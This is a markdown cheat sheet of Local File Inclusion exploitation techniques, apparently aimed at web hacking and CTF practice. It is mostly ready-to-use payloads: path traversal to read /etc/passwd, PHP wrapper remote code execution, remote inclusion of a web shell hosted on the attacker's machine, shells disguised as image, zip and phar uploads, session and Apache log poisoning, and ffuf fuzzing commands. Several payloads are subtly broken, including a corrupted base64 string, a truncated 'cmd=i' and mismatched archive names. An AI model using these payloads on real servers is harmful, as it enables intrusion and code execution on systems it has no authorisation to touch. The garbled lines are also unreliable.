# Local File Inclusion (LFI) — Cheat Sheet

A summary of **LFI exploitation techniques** used in web hacking and CTF platforms. Includes payload examples, bypass techniques, RCE via PHP wrappers, file upload tricks, fuzzing, wordlists and log poisoning.


## What is LFI?
**Local File Inclusion (LFI)** is a vulnerability where an attacker can include files on a web server using a parameter such as:  /index.php?language=FILE

If not properly sanitized, this allows reading sensitive files (e.g. `/etc/passwd`) or achieving **Remote Code Execution (RCE)**.

---

## Basic LFI Payloads

| Type | Example |
|------|---------|
| Basic LFI | `/index.php?language=/etc/passwd` |
| Path Traversal | `/index.php?language=..//etc/passwd` |
| With Prefix | `/index.php?language=/../../../etc/passwd` |
| Approved Path Bypass | `/index.php?language=./languages/../etc/passwd` |
| Path Traversal Filters | `index.php?language=..../...///..//etc/passwd` |  
| URL Encoding | `/index.php?language=%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` |
| Path Truncation (Obsolete) | `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED 2048x]` |
| Null Byte Injection (Obsolete) | `/index.php?language=..//etc/passwd%00` |
| Read PHP with base64 filter | `/index.php?language=php://filter/read=convert.base64-encode/resource=config` |

After retrieving the result, decode it:
`echo 'BASE64_ENCODED_TEXT' | base64 -d`

Tip: Use **CyberChef** to encode payloads.  

---

## Remote Code Execution 

**PHP Wrappers**  
RCE with data wrapper:  
`/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR@VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`  
RCE with expect wrapper:  
`curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`  

**RFI**  
Host web shell:  
`echo '<?php system($_GET["cmd"]); ?>' >shell.php && python3 -m http.server<LISTENING_PORT>`  
Include remote PHP web shell:  
`/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`  

**LFI + Upload**  
Create malicious image:  
`echo 'GIF8<?php system($_GET["cmd"]); ?v' >shell.gif`  
RCE with malicious uploaded image:  
`/index.php?language=./profile_images/shell.gif&cmd=i`  
Create malicious zip archive 'as jpg':  
`echo '<?php system($_GET["cmd"]); ?>' >shell.php && zip shell.jpg shell.php`  
RCE with malicious uploaded zip:  
`/index.php?language=zip://shell.zip%23shell.php&cmd=id`  
Create malicious phar 'as jpg':  
`php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`  
RCE with malicious uploaded phar:  
`/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`  

**Log Poisoning**
Read PHP session parameters:  
`/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`  
Poison PHP session with web shell:  
`/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`  
RCE through poisoned PHP session:  
`/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`  
Poison server log:  
`curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'`  
RCE through poisoned PHP session:  
`/index.php?language=/var/log/apache2/access.log&cmd=id`  

## Misc  
Fuzz page parameters:  
`ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`  
Fuzz LFI payloads:  
`ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`  
Fuzz webroot path:  
`ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287`
Fuzz server configurations:   
`ffuf -w ./LFI-WordList-Linux: FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=.././FUZZ' -fs 2287`  


